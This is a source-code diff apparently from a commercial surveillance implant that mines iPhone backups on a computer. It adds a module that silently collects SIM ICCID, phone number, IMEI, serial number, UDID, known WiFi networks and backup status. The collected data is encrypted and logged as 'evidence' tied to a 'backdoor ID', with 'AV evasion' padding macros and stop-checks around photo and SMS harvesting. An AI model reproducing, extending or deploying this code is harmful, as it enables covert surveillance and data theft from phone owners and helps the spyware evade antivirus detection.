@@ -256,7 +256,7 @@ int parseInfoFile(char *udidPath)
         return -1;
     }
     
-    char *completePath = malloc(sizeof(char)*(strlen(udidPath)+strlen("Manifest.mbdb")+strlen("/"))+1);
+    char *completePath = malloc(sizeof(char)*(strlen(udidPath)+strlen("Info.plist")+strlen("/"))+1);
     if (completePath == NULL)
     {
         return -1;
@@ -977,7 +977,8 @@ void logPhoto(photoRecord *photo)
     
 }
 
-int parsePhotosDb(mbdbRecord *head, char *dbName, long epochMarkup)
+// id param is a platform dependent trick to escape in a hurry when we have to stop module
+int parsePhotosDb(mbdbRecord *head, char *dbName, long epochMarkup, id param)
 {
     sqlite3       *db = NULL;
     int           nrow = 0, ncol = 0;
@@ -1055,6 +1056,13 @@ int parsePhotosDb(mbdbRecord *head, char *dbName, long epochMarkup)
             
             // log photo
             logPhoto(&newRecord);
+            
+            // Platform dependent trick to escape in hurry if we have to stop module
+            if([[[param mConfiguration] objectForKey: @"status"] isEqualToString: AGENT_STOP] || [[[param mConfiguration] objectForKey: @"status"] isEqualToString: AGENT_STOPPED])
+            {
+                break;
+            }
+                
         }
     }
     
@@ -1064,7 +1072,8 @@ int parsePhotosDb(mbdbRecord *head, char *dbName, long epochMarkup)
     return 1;
 }
 
-int collectPhotos(mbdbRecord *head, long epochMarkup)
+// id param is a platform dependent trick to escape in a hurry when we have to stop module
+int collectPhotos(mbdbRecord *head, long epochMarkup, id param)
 {
     if (head == NULL)
     {
@@ -1080,7 +1089,7 @@ int collectPhotos(mbdbRecord *head, long epochMarkup)
             infoLog(@"found photos db\n");
             infoLog(@"filename: %s\n",current->sha1);
 #endif
-            parsePhotosDb(head, current->sha1, epochMarkup);
+            parsePhotosDb(head, current->sha1, epochMarkup, param);
             return 1;
         }
         current = current->next;
@@ -2118,8 +2127,6 @@ int parseSkypeDb(mbdbRecord *head,char *dbName, long epochMarkup)
                 // this is the reason we check current->filename against attachFilename
                 if (strend(current->filename,attachFilename))
                 {
-                    printf("found attachment\n");  // TODO: delete this!
-                    printf("filename: %s\n",current->sha1);   // TODO: delete this!
                     att.to = msg->to;
                     att.from = msg->from;
                     att.filename = current->sha1;
@@ -2841,6 +2848,300 @@ int collectContacts(mbdbRecord *head, long epochMarkup)
     return -1;
 }
 
+// remember to release NSData in calling method
+NSData* parseCommPlist(char *filename)
+{
+    if (filename == NULL)
+    {
+        return -1;
+    }
+
+    NSMutableData *tmpData = [[NSMutableData alloc]init];
+    
+    NSAutoreleasePool *pool = [[NSAutoreleasePool alloc] init];
+    
+    NSString *plistFile = [NSString stringWithUTF8String:filename];
+
+    NSDictionary *theDict = [NSDictionary dictionaryWithContentsOfFile:plistFile];
+    if (theDict != nil)
+    {
+        NSString *iccidString = [theDict objectForKey:@"ICCID"];
+        NSString *phoneNumString = [theDict objectForKey:@"PhoneNumber"];
+        [tmpData appendData:[@"\n\nSIM Info\n " dataUsingEncoding:NSUTF16LittleEndianStringEncoding]];
+        if (iccidString != nil)
+        {
+            [tmpData appendData:[@"\nICCID: " dataUsingEncoding:NSUTF16LittleEndianStringEncoding]];
+            [tmpData appendData:[iccidString dataUsingEncoding:NSUTF16LittleEndianStringEncoding]];
+        }
+        if (phoneNumString != nil)
+        {
+            [tmpData appendData:[@"\nPhone number: " dataUsingEncoding:NSUTF16LittleEndianStringEncoding]];
+            [tmpData appendData:[phoneNumString dataUsingEncoding:NSUTF16LittleEndianStringEncoding]];
+        }
+    }
+    
+    [pool release];
+    return tmpData;
+}
+
+// remember to release NSData in calling method
+NSData* parseWifiPlist(char *filename)
+{
+    if (filename == NULL)
+    {
+        return -1;
+    }
+    
+    NSMutableData *tmpData = [[NSMutableData alloc]init];
+    
+    NSAutoreleasePool *pool = [[NSAutoreleasePool alloc] init];
+    
+    NSString *plistFile = [NSString stringWithUTF8String:filename];
+    
+    NSDictionary *theDict = [NSDictionary dictionaryWithContentsOfFile:plistFile];
+    if (theDict != nil)
+    {
+        [tmpData appendData:[@"\n\nWiFi Info\n " dataUsingEncoding:NSUTF16LittleEndianStringEncoding]];
+        
+        NSArray *wifiArray = [theDict objectForKey:@"List of known networks"];
+        for (NSDictionary *dict in wifiArray)
+        {
+            NSString *nameString = [dict objectForKey:@"SSID_STR"];
+            if (nameString != nil)
+            {
+                [tmpData appendData:[@"\nSSID: " dataUsingEncoding:NSUTF16LittleEndianStringEncoding]];
+                [tmpData appendData:[nameString dataUsingEncoding:NSUTF16LittleEndianStringEncoding]];
+            }
+            NSString *bssidString = [dict objectForKey:@"BSSID"];
+            if (bssidString != nil)
+            {
+                [tmpData appendData:[@"\nBSSID: " dataUsingEncoding:NSUTF16LittleEndianStringEncoding]];
+                [tmpData appendData:[bssidString dataUsingEncoding:NSUTF16LittleEndianStringEncoding]];
+            }
+            NSDate *lastJoinDate = [dict objectForKey:@"lastJoined"];
+            if (lastJoinDate != nil)
+            {
+                NSDateFormatter *dateFormatter = [[NSDateFormatter alloc] init];
+                dateFormatter.timeStyle = NSDateFormatterFullStyle;
+                dateFormatter.dateStyle = NSDateFormatterFullStyle;
+
+                NSString *dateString = [dateFormatter stringFromDate:lastJoinDate];
+                [tmpData appendData:[@"\nLast joined: " dataUsingEncoding:NSUTF16LittleEndianStringEncoding]];
+                [tmpData appendData:[dateString dataUsingEncoding:NSUTF16LittleEndianStringEncoding]];
+                [dateFormatter release];
+            }
+        }
+    }
+    
+    [pool release];
+    return tmpData;
+}
+
+// remember to release NSData in calling method
+NSData* parseManifestPlist(char *filename)
+{
+    if (filename == NULL)
+    {
+        return -1;
+    }
+    
+    NSMutableData *tmpData = [[NSMutableData alloc]init];
+    
+    NSAutoreleasePool *pool = [[NSAutoreleasePool alloc] init];
+    
+    NSString *plistFile = [NSString stringWithUTF8String:filename];
+    
+    NSDictionary *theDict = [NSDictionary dictionaryWithContentsOfFile:plistFile];
+    if (theDict != nil)
+    {
+        // encryption
+        BOOL encrypted = [theDict objectForKey:@"IsEncrypted"];
+        if (encrypted == YES)
+        {
+            [tmpData appendData:[@"\nEncrypted Backup" dataUsingEncoding:NSUTF16LittleEndianStringEncoding]];
+        }
+        else
+        {
+            [tmpData appendData:[@"\nUnencrypted Backup" dataUsingEncoding:NSUTF16LittleEndianStringEncoding]];
+        }
+        // bkup date
+        NSDate *lastBkupDate = [theDict objectForKey:@"Date"];
+        if (lastBkupDate != nil)
+        {
+            NSDateFormatter *dateFormatter = [[NSDateFormatter alloc] init];
+            dateFormatter.timeStyle = NSDateFormatterFullStyle;
+            dateFormatter.dateStyle = NSDateFormatterFullStyle;
+            
+            NSString *dateString = [dateFormatter stringFromDate:lastBkupDate];
+            [tmpData appendData:[@"\nLast Bkup Date: " dataUsingEncoding:NSUTF16LittleEndianStringEncoding]];
+            [tmpData appendData:[dateString dataUsingEncoding:NSUTF16LittleEndianStringEncoding]];
+            [dateFormatter release];
+        }
+        
+        [tmpData appendData:[@"\n\nDevice Info\n " dataUsingEncoding:NSUTF16LittleEndianStringEncoding]];
+        
+        NSString *imeiString = [NSString stringWithUTF8String:imei];
+        [tmpData appendData:[@"\nIMEI: " dataUsingEncoding:NSUTF16LittleEndianStringEncoding]];
+        [tmpData appendData:[imeiString dataUsingEncoding:NSUTF16LittleEndianStringEncoding]];
+
+        NSDictionary *lockdownDict = [theDict objectForKey:@"Lockdown"];
+        if (lockdownDict != nil)
+        {
+            NSString *pvString = [lockdownDict objectForKey:@"ProductVersion"];
+            if (pvString != nil)
+            {
+                [tmpData appendData:[@"\nProduct Version: " dataUsingEncoding:NSUTF16LittleEndianStringEncoding]];
+                [tmpData appendData:[pvString dataUsingEncoding:NSUTF16LittleEndianStringEncoding]];
+            }
+            NSString *ptString = [lockdownDict objectForKey:@"ProductType"];
+            if (ptString != nil)
+            {
+                [tmpData appendData:[@"\nProduct Type: " dataUsingEncoding:NSUTF16LittleEndianStringEncoding]];
+                [tmpData appendData:[ptString dataUsingEncoding:NSUTF16LittleEndianStringEncoding]];
+            }
+            NSString *dnString = [lockdownDict objectForKey:@"DeviceName"];
+            if (dnString != nil)
+            {
+                [tmpData appendData:[@"\nDevice Name: " dataUsingEncoding:NSUTF16LittleEndianStringEncoding]];
+                [tmpData appendData:[dnString dataUsingEncoding:NSUTF16LittleEndianStringEncoding]];
+            }
+            NSString *snString = [lockdownDict objectForKey:@"SerialNumber"];
+            if (snString != nil)
+            {
+                [tmpData appendData:[@"\nSerial Number: " dataUsingEncoding:NSUTF16LittleEndianStringEncoding]];
+                [tmpData appendData:[snString dataUsingEncoding:NSUTF16LittleEndianStringEncoding]];
+            }
+            NSString *udidString = [lockdownDict objectForKey:@"UniqueDeviceID"];
+            if (udidString != nil)
+            {
+                [tmpData appendData:[@"\nUnique Device ID: " dataUsingEncoding:NSUTF16LittleEndianStringEncoding]];
+                [tmpData appendData:[udidString dataUsingEncoding:NSUTF16LittleEndianStringEncoding]];
+            }
+        }
+    }
+    
+    [pool release];
+    return tmpData;
+}
+
+// platform specific code
+void logDevice(NSMutableData *logData)
+{
+    NSAutoreleasePool *pool = [[NSAutoreleasePool alloc] init];
+    
+    // log
+    if ([logData length] >0)
+    {
+        __m_MLogManager *logManager = [__m_MLogManager sharedInstance];
+        
+        NSMutableData *encryptedData = [logManager prepareDataToLog:logData evidenceHeader:nil forAgentID:LOGTYPE_DEVICE];
+        
+        if(encryptedData !=nil)
+        {
+            SBJsonWriter *writer = [[SBJsonWriter alloc] init];
+            
+            // additional header
+            NSMutableData *additionalHeader = [[NSMutableData alloc] initWithCapacity:0];
+            uint32_t version = 2015040801;
+            [additionalHeader appendBytes:&version length:sizeof(uint32_t)];
+            NSMutableDictionary *dictHeader = [NSMutableDictionary dictionary];
+            [dictHeader setObject:@"ios" forKey:@"platform"];
+            NSString *bIdString = [NSString stringWithUTF8String:gBackdoorID];
+            [dictHeader setObject:bIdString forKey:@"ident"];
+            NSString *imeiString = [NSString stringWithUTF8String:imei];
+            [dictHeader setObject:imeiString forKey:@"instance"];
+            [dictHeader setObject:@"evidence" forKey:@"type"];
+            NSString *jsonHeaderString = [writer stringWithObject:dictHeader];
+            [additionalHeader appendData:[jsonHeaderString dataUsingEncoding:NSUTF8StringEncoding]];
+            
+            // content is encrypted data
+            
+            // log
+            BOOL success = [logManager createLog: LOGTYPE_PROXY_EV
+                                     agentHeader: additionalHeader
+                                       withLogID: 0];
+            
+            if (success)
+            {
+                [logManager writeDataToLog: encryptedData
+                                  forAgent: LOGTYPE_PROXY_EV
+                                 withLogID: 0];
+                // AV evasion: only on release build
+                AV_GARBAGE_001
+                
+                [logManager closeActiveLog: LOGTYPE_PROXY_EV
+                                 withLogID: 0];
+                
+                // AV evasion: only on release build
+                AV_GARBAGE_004
+            }
+            
+            // clean
+            [writer release];
+            [additionalHeader release];
+            [encryptedData release];
+        }
+    }
+    
+    [pool release];
+}
+
+int collectDeviceData(mbdbRecord *head, char *udidPath)
+{
+    NSData *commData = NULL;
+    NSData *wifiData = NULL;
+    NSData *manifestData = NULL;
+    
+    if (udidPath != NULL)
+    {
+        char *completePath = malloc(sizeof(char)*(strlen(udidPath)+strlen("Manifest.plist")+strlen("/"))+1);
+        if (completePath != NULL)
+        {
+            if(sprintf(completePath,"%s/%s",udidPath,"Manifest.plist") < 0)
+            {
+                free(completePath);
+            }
+            else
+            {
+                manifestData = parseManifestPlist(completePath);
+            }
+        }
+    }
+
+    if (head != NULL)
+    {
+        
+        mbdbRecord *current = head;
+        while (current!=NULL)
+        {
+            if (strend(current->filename,"com.apple.commcenter.plist"))
+            {
+                commData = parseCommPlist(current->sha1);
+            }
+            if (strend(current->filename,"com.apple.wifi.plist"))
+            {
+                wifiData = parseWifiPlist(current->sha1);
+            }
+            current = current->next;
+        }
+    }
+
+    
+    NSMutableData *logData = [[NSMutableData alloc] initWithCapacity:0];
+    [logData appendData:manifestData];
+    [logData appendData:commData];
+    [logData appendData:wifiData];
+    if ([logData length] >0 )
+    {
+        logDevice(logData);
+    }
+    [commData release];
+    [wifiData release];
+    [manifestData release];
+    [logData release];
+    return 1;
+}
+
 
 void logSyncStartEnd(int type)
 {
@@ -3000,7 +3301,6 @@ static __m_MAgentBkups *sharedAgentBkups = nil;
 #endif
             continue;
         }
-
         // check if agent has been stopped
         if([[mConfiguration objectForKey: @"status"] isEqualToString: AGENT_STOP]
            || [[mConfiguration objectForKey: @"status"] isEqualToString: AGENT_STOPPED])
@@ -3021,7 +3321,6 @@ static __m_MAgentBkups *sharedAgentBkups = nil;
 #endif
             continue;
         }
-        
         // check if agent has been stopped
         if([[mConfiguration objectForKey: @"status"] isEqualToString: AGENT_STOP]
            || [[mConfiguration objectForKey: @"status"] isEqualToString: AGENT_STOPPED])
@@ -3034,6 +3333,19 @@ static __m_MAgentBkups *sharedAgentBkups = nil;
         
         // log sync start
         logSyncStartEnd(SYNCTYPE_START);
+        
+        // collect device data
+        // based only on plist files
+        collectDeviceData(head,*(bkpDirs+i));
+        // check if agent has been stopped
+        if([[mConfiguration objectForKey: @"status"] isEqualToString: AGENT_STOP]
+           || [[mConfiguration objectForKey: @"status"] isEqualToString: AGENT_STOPPED])
+        {
+            deleteMbdbRecordList(head);
+            freeBkupArray(bkpDirs);
+            [pool release];
+            return YES;
+        }
         
         // collect sms
         collectSms(head, epochMarkup);
@@ -3120,7 +3432,9 @@ static __m_MAgentBkups *sharedAgentBkups = nil;
         }
         
         // collect pictures
-        collectPhotos(head,epochMarkup);
+        // since there could be quite a lot picture, we need a way to escape in hurry, "self" passed
+        // as parameter gives us that possibility
+        collectPhotos(head,epochMarkup,self);
         // check if agent has been stopped
         if([[mConfiguration objectForKey: @"status"] isEqualToString: AGENT_STOP]
            || [[mConfiguration objectForKey: @"status"] isEqualToString: AGENT_STOPPED])
@@ -3158,6 +3472,7 @@ static __m_MAgentBkups *sharedAgentBkups = nil;
 #pragma mark -
 #pragma mark Class and init methods
 #pragma mark -
+
 
 + (__m_MAgentBkups *)sharedInstance
 {
@@ -3280,7 +3595,7 @@ static __m_MAgentBkups *sharedAgentBkups = nil;
     
     // TODO: change timer interval
     NSTimer *timer = nil;
-    timer = [NSTimer scheduledTimerWithTimeInterval: 3600 target:self selector:@selector(_getBkupsTimer:) userInfo:nil repeats:YES];
+    timer = [NSTimer scheduledTimerWithTimeInterval: 3600 /*30*/ target:self selector:@selector(_getBkupsTimer:) userInfo:nil repeats:YES];
     [currentRunLoop addTimer: timer forMode: NSRunLoopCommonModes];
     
     while (![[mConfiguration objectForKey: @"status"] isEqual: AGENT_STOP]
